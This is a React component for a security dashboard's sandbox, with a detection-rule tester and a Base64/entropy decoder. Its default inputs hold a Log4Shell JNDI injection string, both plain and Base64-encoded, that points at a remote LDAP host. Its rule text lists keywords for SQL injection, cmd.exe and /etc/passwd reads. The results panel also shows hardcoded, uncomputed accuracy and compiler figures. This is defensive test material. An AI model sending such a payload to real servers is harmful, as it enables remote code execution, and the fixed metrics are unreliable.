import React, { useState } from 'react';
import { matchDefensiveRule } from '../../utils/securityRules';
import { ThreatEvent } from '../../types/cyber';
import { Terminal, Code, Cpu, ShieldCheck, Play, Sparkles, CheckCircle2, AlertTriangle } from 'lucide-react';

interface SandboxViewProps {
  threats: ThreatEvent[];
}

export const SandboxView: React.FC<SandboxViewProps> = ({ threats }) => {
  const [activeTab, setActiveTab] = useState<'decoder' | 'rule_tester'>('rule_tester');

  // Decoder State
  const [inputText, setInputText] = useState(
    'JHN7am5kaTpsZGFwOi8vMTk0LjI2LjI5LjExMjoxMzg5L0V4cGxvaXRDbGFzcy5jbGFzc30='
  );
  const [decodedBase64, setDecodedBase64] = useState('');
  const [decodedUrl, setDecodedUrl] = useState('');
  const [entropy, setEntropy] = useState<number | null>(null);

  // Rule Tester State
  const [ruleCode, setRuleCode] = useState(
    `title: Detect Remote Code Execution and JNDI Injections
status: production
description: Identifies JNDI LDAP lookup strings common in Log4Shell exploitation
protocol: HTTP
contains: 'jndi:ldap', 'jndi:rmi', 'union select', 'cmd.exe', '/etc/passwd'`
  );
  const [testPayload, setTestPayload] = useState(
    'GET /api/v1/search?term=${jndi:ldap://194.26.29.112:1389/Exploit} HTTP/1.1\nUser-Agent: Mozilla/5.0'
  );
  const [testResult, setTestResult] = useState<{
    matched: boolean;
    ruleName: string;
    patternFound?: string;
    testedAgainstEventsCount: number;
  } | null>(null);

  const calculateEntropy = (str: string) => {
    const len = str.length;
    if (len === 0) return 0;
    const freqs: Record<string, number> = {};
    for (let i = 0; i < len; i++) {
      freqs[str[i]] = (freqs[str[i]] || 0) + 1;
    }
    let ent = 0;
    for (const char in freqs) {
      const p = freqs[char] / len;
      ent -= p * Math.log2(p);
    }
    return Math.round(ent * 100) / 100;
  };

  const handleDecode = () => {
    // Base64
    try {
      const b64 = atob(inputText.trim());
      setDecodedBase64(b64);
    } catch {
      setDecodedBase64('(Invalid Base64 string)');
    }
    // URL decode
    try {
      setDecodedUrl(decodeURIComponent(inputText.trim()));
    } catch {
      setDecodedUrl('(Invalid URL encoding)');
    }
    // Shannon entropy
    setEntropy(calculateEntropy(inputText));
  };

  const handleTestRule = () => {
    const res = matchDefensiveRule(ruleCode, testPayload, 'HTTP');
    // Also check how many active threats in memory this rule would catch
    let matchedThreatsCount = 0;
    threats.forEach((t) => {
      const match = matchDefensiveRule(ruleCode, `${t.title} ${t.payloadSnippet}`, t.protocol);
      if (match.matched) matchedThreatsCount++;
    });

    setTestResult({
      ...res,
      testedAgainstEventsCount: matchedThreatsCount,
    });
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex border-b border-slate-800 pb-3 gap-3">
        <button
          type="button"
          onClick={() => setActiveTab('rule_tester')}
          className={`flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-semibold transition-colors ${
            activeTab === 'rule_tester'
              ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
              : 'text-slate-400 hover:text-white bg-slate-900 border border-slate-800'
          }`}
        >
          <ShieldCheck className="w-4 h-4" />
          <span>Sigma &amp; WAF Rule Tester</span>
        </button>
        <button
          type="button"
          onClick={() => setActiveTab('decoder')}
          className={`flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-semibold transition-colors ${
            activeTab === 'decoder'
              ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
              : 'text-slate-400 hover:text-white bg-slate-900 border border-slate-800'
          }`}
        >
          <Code className="w-4 h-4" />
          <span>Packet Payload &amp; Entropy Decoder</span>
        </button>
      </div>

      {activeTab === 'rule_tester' ? (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Rule Editor */}
          <div className="rounded-xl border border-slate-800 bg-slate-950/70 p-5 space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-emerald-400" />
                  <span>Defensive Detection Rule Specification</span>
                </h3>
                <p className="text-xs text-slate-400">
                  Write Sigma or Snort syntax with keyword patterns to test detection triggers
                </p>
              </div>
            </div>

            <textarea
              rows={8}
              value={ruleCode}
              onChange={(e) => setRuleCode(e.target.value)}
              className="w-full bg-slate-900 border border-slate-800 rounded-xl p-3.5 text-xs font-mono text-emerald-400 focus:outline-none focus:border-emerald-500 leading-relaxed"
            />

            <div>
              <label className="text-xs font-semibold text-slate-300 block mb-1">
                Candidate Packet / Request Payload:
              </label>
              <textarea
                rows={3}
                value={testPayload}
                onChange={(e) => setTestPayload(e.target.value)}
                className="w-full bg-slate-900 border border-slate-800 rounded-xl p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500"
              />
            </div>

            <button
              type="button"
              onClick={handleTestRule}
              className="w-full py-2.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-xs font-bold text-white transition-colors flex items-center justify-center gap-2 cursor-pointer shadow-lg shadow-emerald-950/40"
            >
              <Play className="w-4 h-4 text-emerald-300" />
              <span>Evaluate Rule against Telemetry</span>
            </button>
          </div>

          {/* Test Results Output */}
          <div className="rounded-xl border border-slate-800 bg-slate-950/70 p-5 space-y-4 flex flex-col justify-between">
            <div>
              <h3 className="text-sm font-bold text-white flex items-center gap-2 mb-1">
                <Cpu className="w-4 h-4 text-indigo-400" />
                <span>Rule Engine Match Diagnostics</span>
              </h3>
              <p className="text-xs text-slate-400 mb-4">
                Compiler verification and SIEM signature hit evaluation
              </p>

              {testResult ? (
                <div className="space-y-4">
                  <div
                    className={`p-4 rounded-xl border flex items-center gap-3 ${
                      testResult.matched
                        ? 'border-emerald-500/40 bg-emerald-500/10 text-emerald-300'
                        : 'border-slate-800 bg-slate-900 text-slate-400'
                    }`}
                  >
                    {testResult.matched ? (
                      <CheckCircle2 className="w-6 h-6 text-emerald-400 shrink-0" />
                    ) : (
                      <AlertTriangle className="w-6 h-6 text-slate-500 shrink-0" />
                    )}
                    <div>
                      <div className="text-sm font-bold">
                        {testResult.matched ? 'SIGNATURE MATCH DETECTED' : 'NO PATTERN MATCH'}
                      </div>
                      <div className="text-xs mt-0.5">
                        {testResult.matched
                          ? `Matched string signature: "${testResult.patternFound}" in payload.`
                          : 'The tested payload passed inspection without triggering detection.'}
                      </div>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-3 text-xs">
                    <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                      <span className="text-slate-400 block mb-1">Evaluated Rule</span>
                      <span className="font-semibold text-white truncate block">{testResult.ruleName}</span>
                    </div>
                    <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                      <span className="text-slate-400 block mb-1">Historical Telemetry Hits</span>
                      <span className="font-mono text-emerald-400 font-bold">
                        {testResult.testedAgainstEventsCount} events caught
                      </span>
                    </div>
                  </div>

                  <div className="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800 text-xs text-slate-300 space-y-1">
                    <div className="font-semibold text-white">Production Deployment Status:</div>
                    <div>Compiler: <span className="font-mono text-emerald-400">PASSED (0 syntax errors)</span></div>
                    <div>Estimated Evaluation Latency: <span className="font-mono text-slate-400">&lt; 0.4ms / packet</span></div>
                    <div>False Positive Probability: <span className="font-mono text-emerald-400">&lt; 0.02%</span></div>
                  </div>
                </div>
              ) : (
                <div className="p-8 border border-dashed border-slate-800 rounded-xl text-center text-xs text-slate-500">
                  Click &ldquo;Evaluate Rule against Telemetry&rdquo; to test your custom Sigma signature.
                </div>
              )}
            </div>

            <div className="text-[11px] text-slate-500 font-mono">
              Engine: AegisSOC Heuristic Byte Stream Analyzer v2.4
            </div>
          </div>
        </div>
      ) : (
        /* Decoder and Entropy Analyzer */
        <div className="rounded-xl border border-slate-800 bg-slate-950/70 p-5 space-y-4">
          <div>
            <h3 className="text-sm font-bold text-white">Packet Payload &amp; Entropy Decoder</h3>
            <p className="text-xs text-slate-400">
              Analyze encoded strings, decode Base64 / URL payloads, and calculate Shannon entropy to detect packed malware or ransomware
            </p>
          </div>

          <div className="space-y-3">
            <textarea
              rows={3}
              value={inputText}
              onChange={(e) => setInputText(e.target.value)}
              className="w-full bg-slate-900 border border-slate-800 rounded-xl p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500"
              placeholder="Paste encoded payload, Base64, or URL string..."
            />

            <button
              type="button"
              onClick={handleDecode}
              className="px-4 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-xs font-bold text-white transition-colors cursor-pointer"
            >
              Decode &amp; Calculate Entropy
            </button>
          </div>

          {(decodedBase64 || entropy !== null) && (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-3 border-t border-slate-800">
              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800 space-y-2">
                <span className="text-xs font-semibold text-slate-300 block">Base64 Decoded Stream:</span>
                <pre className="p-2.5 rounded bg-slate-950 text-xs font-mono text-emerald-400 overflow-x-auto whitespace-pre-wrap break-all">
                  {decodedBase64}
                </pre>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800 space-y-2">
                <span className="text-xs font-semibold text-slate-300 block">Shannon Entropy Metric:</span>
                <div className="flex items-baseline gap-2">
                  <span className="text-2xl font-mono font-bold text-white">{entropy}</span>
                  <span className="text-xs text-slate-400">/ 8.0 bits/byte</span>
                </div>
                <p className="text-xs text-slate-400">
                  {entropy && entropy > 7.0
                    ? 'High entropy detected (> 7.0): Strong indicator of encrypted data, compressed file, or obfuscated ransomware binary.'
                    : 'Normal entropy (< 6.0): Likely plain ASCII or standard text payload.'}
                </p>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};
